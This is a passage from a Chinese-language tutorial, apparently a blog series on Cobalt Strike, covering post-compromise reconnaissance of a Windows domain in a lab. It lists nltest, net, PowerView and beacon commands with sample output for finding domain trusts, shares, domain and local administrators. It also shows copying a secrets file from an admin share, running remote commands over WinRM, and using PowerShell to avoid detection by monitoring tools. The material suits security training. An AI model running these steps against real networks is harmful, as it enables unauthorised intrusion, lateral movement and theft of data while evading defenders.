class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; nslookup WIN<span class="literal">-P2AASSD1AF1</span></span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  ::<span class="number">1</span></span><br><span class="line">名称:    WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com</span><br><span class="line">Address:  <span class="number">192.168</span>.<span class="number">15.124</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; ping <span class="literal">-n</span> <span class="number">1</span> <span class="literal">-4</span> WIN<span class="literal">-P2AASSD1AF1</span></span><br><span class="line">正在 Ping WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com [<span class="number">192.168</span><span class="type">.15.124</span>] 具有 <span class="number">32</span> 字节的数据:</span><br><span class="line">来自 <span class="number">192.168</span>.<span class="number">15.124</span> 的回复: 字节=<span class="number">32</span> 时间&lt;<span class="number">1</span>ms TTL=<span class="number">128</span></span><br><span class="line"><span class="number">192.168</span>.<span class="number">15.124</span> 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = <span class="number">1</span>，已接收 = <span class="number">1</span>，丢失 = <span class="number">0</span> (<span class="number">0</span>% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = <span class="number">0</span>ms，最长 = <span class="number">0</span>ms，平均 = <span class="number">0</span>ms</span><br></pre></td></tr></table></figure><ul><li><p><code>nltest /domain_trusts</code>、<code>nltest /server:[address] /domain_trusts</code></p><p>如果想取得域上的信任关系，可以使用 nltest 命令来实现</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; nltest /domain_trusts</span><br><span class="line">域信任的列表:</span><br><span class="line">    <span class="number">0</span>: TEAMSSIX teamssix.com (NT <span class="number">5</span>) (Forest Tree Root) (Primary Domain) (Native)</span><br><span class="line">此命令成功完成</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; nltest /server:<span class="number">192.168</span>.<span class="number">15.124</span> /domain_trusts</span><br><span class="line">域信任的列表:</span><br><span class="line">    <span class="number">0</span>: TEAMSSIX teamssix.com (NT <span class="number">5</span>) (Forest Tree Root) (Primary Domain) (Native)</span><br><span class="line">此命令成功完成</span><br></pre></td></tr></table></figure><ul><li><p><code>net view \\[name]</code></p><p>如果想列出主机上的共享列表，只需输入<code>net view \\[name]</code>即可</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; net view \\WIN<span class="literal">-P2AASSD1AF1</span></span><br><span class="line">在 \\WIN<span class="literal">-75F8PRJM4TP</span> 的共享资源</span><br><span class="line">共享名  类型  使用为  注释</span><br><span class="line"><span class="literal">----------------------------------</span></span><br><span class="line">Users   Disk</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p>PowerView</p><p>在渗透进入内网后，如果直接使用 Windows 的内置命令，比如 <code>net view、net user</code>等，可能就会被管理人员或者各种安全监控设备所发现。因此较为安全的办法就是使用 Powershell 和 VMI 来进行躲避态势感知的检测。</p><p>PowerView 是由 Will Schroeder 开发的 PowerShell 脚本，该脚本完全依赖于 Powershell 和 VMI ，使用 PowerView 可以更好的收集内网中的信息，在使用之前，与上一节 PowerUp 的一样需要先 import 导入 ps1 文件。</p><p>PowerView 下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p><p>一些 PowerView 的命令：</p><ul><li><p>Get-NetDomain</p><p>查询本地域的信息</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\PowerView&gt; <span class="built_in">Get-NetDomain</span></span><br><span class="line">Forest                  : teamssix.com</span><br><span class="line">DomainControllers       : &#123;WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com&#125;</span><br><span class="line">Children                : &#123;&#125;</span><br><span class="line">DomainMode              : Windows2012Domain</span><br><span class="line">Parent                  :</span><br><span class="line">PdcRoleOwner            : WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com</span><br><span class="line">RidRoleOwner            : WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com</span><br><span class="line">InfrastructureRoleOwner : WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com</span><br><span class="line">Name                    : teamssix.com</span><br></pre></td></tr></table></figure><ul><li><p>Invoke-ShareFinder</p><p>查找网络上是否存在共享</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\PowerView&gt; <span class="built_in">Invoke-ShareFinder</span></span><br><span class="line">\\WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com\ADMIN<span class="variable">$</span>   - 远程管理</span><br><span class="line">\\WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com\C<span class="variable">$</span>       - 默认共享</span><br><span class="line">\\WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com\IPC<span class="variable">$</span>     - 远程 IPC</span><br><span class="line">\\WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com\NETLOGON         - Logon server share</span><br><span class="line">\\WIN<span class="literal">-P2AASSD1AF1</span>.teamssix.com\SYSVOL   - Logon server share</span><br></pre></td></tr></table></figure><ul><li><p>Invoke-MapDomainTrust</p><p>显示当前域的信任关系</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\PowerView&gt; <span class="built_in">Invoke-MapDomainTrust</span></span><br></pre></td></tr></table></figure><p>其他更多用法可以参考 PowerView 项目上的 ReadMe 部分</p><p><strong>Net 模块</strong></p><p>Cobalt Strike 中有自己的 net 模块，net 模块是 beacon 后渗透攻击模块，它通过 windows 的网络管理 api 函数来执行命令，想使用 net 命令，只需要在 beacon 的控制中心输入 net + 要执行的命令即可。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net dclist : 列出当前域的域控制器</span><br><span class="line">net dclist [<span class="type">DOMAIN</span>] : 列出指定域的域控制器</span><br><span class="line">net share \\[<span class="type">name</span>] : 列出目标的共享列表</span><br><span class="line">net view : 列出当前域的主机</span><br><span class="line">net view [<span class="type">DOMAIN</span>] : 列出指定域的主机</span><br></pre></td></tr></table></figure><p>在 beacon 控制台中输入这些命令很类似输入一个本地的 net 命令，但是有一些些许的不同，比如下面一个是在主机上运行 net view 的结果一个是在 beacon 控制台下运行 net view 的结果。不难看出，beacon 下输出的结果更为丰富。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; net view</span><br><span class="line">服务器名称            注解</span><br><span class="line"><span class="literal">-------------------------------------------</span></span><br><span class="line">\\WIN<span class="literal">-P2AASSD1AF1</span></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; net view</span><br><span class="line">[*] Tasked beacon to run net view</span><br><span class="line">[+] host called home, sent: <span class="number">104504</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">List of hosts:</span><br><span class="line">Server Name             IP Address                       Platform  Version  <span class="built_in">Type</span>   Comment</span><br><span class="line"><span class="literal">-----------</span>             <span class="literal">----------</span>                       <span class="literal">--------</span>  <span class="literal">-------</span>  <span class="literal">----</span>   <span class="literal">-------</span></span><br><span class="line">WIN<span class="literal">-P2AASSD1AF1</span>         <span class="number">192.168</span>.<span class="number">15.124</span>                   <span class="number">500</span>       <span class="number">6.1</span>      PDC    </span><br></pre></td></tr></table></figure><h6 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a><strong>用户枚举</strong></h6><p>用户枚举的三个关键步骤：</p><p>1、当前账号是否为管理员账号？</p><p>2、哪些账号是域管理员账号？</p><p>3、哪个账号是这个系统上的本地管理员账号？</p><p><strong>管理员账号</strong> </p><p>第一个关键步骤，发现管理员账号。</p><p>如果想知道自己是否为管理员账号，可以尝试运行一些只有管理员账号才有权限操作的命令，然后通过返回结果判断是否为管理员。</p><p>其中一种方式是尝试列出仅仅只有管理员才能查看的共享列表，比如下面的 <code>dir \\host\C$</code> 命令，如果可以看到一个文件列表，那么说明可能拥有本地管理员权限。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">dir</span> \\host\C<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#管理员账号运行结果</span></span><br><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WinDC\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WinDC\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 \\WinDC\C<span class="variable">$</span> 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F269<span class="literal">-89A7</span></span><br><span class="line"> \\WinDC\C<span class="variable">$</span> 的目录</span><br><span class="line"><span class="number">2020</span>/<span class="number">06</span>/<span class="number">24</span>  <span class="number">09</span>:<span class="number">29</span>    &lt;<span class="built_in">DIR</span>&gt;          inetpub</span><br><span class="line"><span class="number">2009</span>/<span class="number">07</span>/<span class="number">14</span>  <span class="number">11</span>:<span class="number">20</span>    &lt;<span class="built_in">DIR</span>&gt;          PerfLogs</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">24</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">52</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">17</span>  <span class="number">23</span>:<span class="number">00</span>    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">26</span>  <span class="number">00</span>:<span class="number">55</span>    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">0</span> 个文件              <span class="number">0</span> 字节</span><br><span class="line">               <span class="number">6</span> 个目录 <span class="number">28</span>,<span class="number">500</span>,<span class="number">807</span>,<span class="number">680</span> 可用字节</span><br><span class="line"></span><br><span class="line"><span class="comment">#一般账号运行结果</span></span><br><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WinDC\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WinDC\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure><p>也可以运行其他命令，比如运行下面的 <code>at</code> 命令来查看系统上的计划任务列表，如果显示出了任务列表信息，那么可能是本地管理员。（当任务列表没有信息时会返回 “列表是空的” 提示）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">shell at \\host</span><br><span class="line"></span><br><span class="line"><span class="comment">#管理员账号运行结果</span></span><br><span class="line">beacon&gt; shell at \\WinDC</span><br><span class="line">[*] Tasked beacon to run: at \\WinDC</span><br><span class="line">[+] host called home, sent: <span class="number">51</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">状态 ID     日期                    时间          命令行</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">        <span class="number">1</span>   今天                    <span class="number">22</span>:<span class="number">30</span>         E:\Install\Thunder\Thunder.exe</span><br><span class="line"></span><br><span class="line"><span class="comment">#一般账号运行结果</span></span><br><span class="line">beacon&gt; shell at \\WinDC</span><br><span class="line">[*] Tasked beacon to run: at \\WinDC</span><br><span class="line">[+] host called home, sent: <span class="number">51</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure><p>在上一节讲述的 <code>PowerView</code> 有很多很好的自动操作来帮助解决这些问题。可以在加载 <code>PowerView</code> 后，运行下面的命令，通过 <code>PowerView</code> 可以快速找到管理员账号</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">Find-LocalAdminAccess</span></span><br><span class="line"></span><br><span class="line">beacon&gt; powershell<span class="literal">-import</span> powerview.ps1</span><br><span class="line">[*] Tasked beacon to import: powerview.ps1</span><br><span class="line">[+] host called home, sent: <span class="number">101224</span> bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell <span class="built_in">Find-LocalAdminAccess</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Find-LocalAdminAccess</span></span><br><span class="line">[+] host called home, sent: <span class="number">329</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">WinDC.teamssix.com</span><br></pre></td></tr></table></figure><p><strong>域管理员账号</strong></p><p>第二个关键步骤，发现域管理员账号。</p><p><strong>列出域管理员</strong></p><p>对于发现域管理员账号，可以在共享里使用本地的Windows命令。运行以下两条命令可以用来找出这些“域群组”的成员。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;enterprise admins&quot;</span> /DOMAIN</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /DOMAIN</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell net <span class="built_in">group</span> <span class="string">&quot;enterprise admins&quot;</span> /domain</span><br><span class="line">[*] Tasked beacon to run: net <span class="built_in">group</span> <span class="string">&quot;enterprise admins&quot;</span> /domain</span><br><span class="line">[+] host called home, sent: <span class="number">68</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">组名     Enterprise Admins</span><br><span class="line">注释     企业的指定系统管理员</span><br><span class="line">成员</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator            </span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain</span><br><span class="line">[*] Tasked beacon to run: net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain</span><br><span class="line">[+] host called home, sent: <span class="number">64</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">组名     Domain Admins</span><br><span class="line">注释     指定的域管理员</span><br><span class="line">成员</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator            </span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p>或者运行下面的命令来看谁是域控制器上的管理员</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup <span class="string">&quot;administrators&quot;</span> /DOMAIN</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell net localgroup <span class="string">&quot;administrators&quot;</span> /domain</span><br><span class="line">[*] Tasked beacon to run: net localgroup <span class="string">&quot;administrators&quot;</span> /domain</span><br><span class="line">[+] host called home, sent: <span class="number">70</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">别名     administrators</span><br><span class="line">注释     管理员对计算机/域有不受限制的完全访问权</span><br><span class="line">成员</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">administrator</span><br><span class="line">Domain Admins</span><br><span class="line">Daniel</span><br><span class="line">Enterprise Admins</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p><strong>Net 模块</strong></p><p>beacon 的 net 模块也可以帮助我们，下面的命令中 <code>TARGET</code> 的意思是一个域控制器或者是任何想查看的组名，比如企业管理员、域管理员等等</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> \\TARGET <span class="built_in">group</span> name</span><br></pre></td></tr></table></figure><p>也可以运行下面的命令，这会连接任意目标来获取列表</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup \\TARGET <span class="built_in">group</span> name</span><br></pre></td></tr></table></figure><p><strong>本地管理员</strong></p><p><strong>Net 模块</strong></p><p>本地管理员可能是一个域账户，因此如果想把一个系统作为目标，应该找到谁是这个系统的本地管理员，因为如果获得了它的密码哈希值或者凭据就可以伪装成那个用户。</p><p>beacon 的 net 模块可以在系统上从一个没有特权的关联中查询本地组和用户。</p><p>在 beacon 控制台中运行下面命令可以获得一个目标上的群组列表</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup \\TARGET</span><br></pre></td></tr></table></figure><p>如果想获取群组的列表，可运行下面的命令来获得一个群组成员的名单列表。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup \\TARGET <span class="built_in">group</span> name</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; net localgroup \\WinDC administrators</span><br><span class="line">[*] Tasked beacon to run net localgroup administrators on WinDC</span><br><span class="line">[+] host called home, sent: <span class="number">104510</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Members of administrators on \\WinDC:</span><br><span class="line">TEAMSSIX\Administrator</span><br><span class="line">TEAMSSIX\Daniel</span><br><span class="line">TEAMSSIX\Enterprise Admins</span><br><span class="line">TEAMSSIX\Domain Admins</span><br></pre></td></tr></table></figure><p><strong>PowerView 模块</strong></p><p>PowerView 使用下面的命令能够在一个主机上找到本地管理员，这条命令实际上通过管理员群组找到同样的群组并且把成员名单返回出来。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Netlocalgroup</span> <span class="literal">-hostname</span> TARGET</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell <span class="built_in">Get-Netlocalgroup</span> <span class="literal">-Hostname</span> WinDC</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Get-Netlocalgroup</span> <span class="literal">-Hostname</span> WinDC</span><br><span class="line">[+] host called home, sent: <span class="number">385</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">ComputerName : WinDC</span><br><span class="line">AccountName  : teamssix.com/Administrator</span><br><span class="line">IsDomain     : True</span><br><span class="line">IsGroup      : False</span><br><span class="line">SID          : S<span class="literal">-1-5-22-3301978333-983314215-684642015-500</span></span><br><span class="line">Description  : </span><br><span class="line">Disabled     : </span><br><span class="line">LastLogin    : <span class="number">2020</span>/<span class="number">8</span>/<span class="number">17</span> <span class="number">22</span>:<span class="number">21</span>:<span class="number">23</span></span><br><span class="line">PwdLastSet   : </span><br><span class="line">PwdExpired   : </span><br><span class="line">UserFlags    : </span><br><span class="line"></span><br><span class="line">ComputerName : WinDC</span><br><span class="line">AccountName  : teamssix.com/Daniel</span><br><span class="line">……内容过多，余下部分省略……</span><br></pre></td></tr></table></figure><h6 id="无需恶意软件"><a href="#无需恶意软件" class="headerlink" title="无需恶意软件"></a>无需恶意软件</h6><p>如果一个系统信任我们为本地管理员权限，那么我们可以在那个系统上干什么呢？</p><p><strong>查看共享文件</strong></p><p>比如我们可以通过运行下面的命令来列出 C:\foo 的共享文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">dir</span> \\host\C<span class="variable">$</span>\foo</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WinDC\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WinDC\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 \\WinDC\C<span class="variable">$</span> 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F269<span class="literal">-89A7</span></span><br><span class="line"> \\WinDC\C<span class="variable">$</span> 的目录</span><br><span class="line"><span class="number">2020</span>/<span class="number">06</span>/<span class="number">24</span>  <span class="number">09</span>:<span class="number">29</span>    &lt;<span class="built_in">DIR</span>&gt;          inetpub</span><br><span class="line"><span class="number">2009</span>/<span class="number">07</span>/<span class="number">14</span>  <span class="number">11</span>:<span class="number">20</span>    &lt;<span class="built_in">DIR</span>&gt;          PerfLogs</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">24</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">52</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">17</span>  <span class="number">23</span>:<span class="number">00</span>    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">26</span>  <span class="number">00</span>:<span class="number">55</span>    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">0</span> 个文件              <span class="number">0</span> 字节</span><br><span class="line">               <span class="number">6</span> 个目录 <span class="number">28</span>,<span class="number">500</span>,<span class="number">393</span>,<span class="number">984</span> 可用字节</span><br></pre></td></tr></table></figure><p><strong>复制文件</strong></p><p>比如运行下面的命令将 <code>secrets.txt</code>文件复制到当前目录。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">copy</span> \\host\C<span class="variable">$</span>\foo\secrets.txt</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">copy</span> \\WinDC\C<span class="variable">$</span>\foo\secrets.txt</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">copy</span> \\WinDC\C<span class="variable">$</span>\foo\secrets.txt</span><br><span class="line">[+] host called home, sent: <span class="number">93</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">已复制         <span class="number">1</span> 个文件。</span><br></pre></td></tr></table></figure><p><strong>查看文件列表</strong></p><p>比如运行下面的命令。其中 &#x2F;S 表示列出指定目录及子目录所有文件，&#x2F;B 表示使用空格式，即没有标题或摘要信息。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">dir</span> /S /B \\host\C<span class="variable">$</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">dir</span> /S /B \\WinDC\C<span class="variable">$</span>\Users</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> /S /B \\WinDC\C<span class="variable">$</span>\Users</span><br><span class="line">[+] host called home, sent: <span class="number">67</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\administrator</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\Classic .NET AppPool</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\Daniel</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\Public</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\administrator\Contacts</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\administrator\Desktop</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\administrator\Documents</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\administrator\Downloads</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\administrator\Favorites</span><br><span class="line">……内容过多，余下部分省略……</span><br></pre></td></tr></table></figure><p><strong>使用 WinRM 运行命令</strong></p><p>WinRM 运行在 5985 端口上，WinRM 是 Windows 远程管服务，使用 WinRM 可以使远程管理更容易一些。</p><p>如果想利用 WinRM 运行命令则可以使用下面的命令。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> TARGET <span class="literal">-ScriptBlock</span> &#123;command here&#125;</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td 